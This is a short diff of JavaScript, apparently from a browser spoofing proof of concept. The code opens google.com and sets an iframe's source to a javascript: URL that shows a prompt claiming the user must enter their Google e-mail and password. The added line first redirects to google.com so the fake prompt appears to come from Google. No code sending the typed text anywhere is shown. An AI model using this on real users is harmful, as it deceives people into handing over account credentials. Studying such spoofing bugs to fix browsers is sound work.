@@ -7,7 +7,7 @@
 
       window.open("https://www.google.com");
 
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+      document.getElementById("iframe").src = 'javascript:document.location="https://www.google.com";prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
     
     }
     
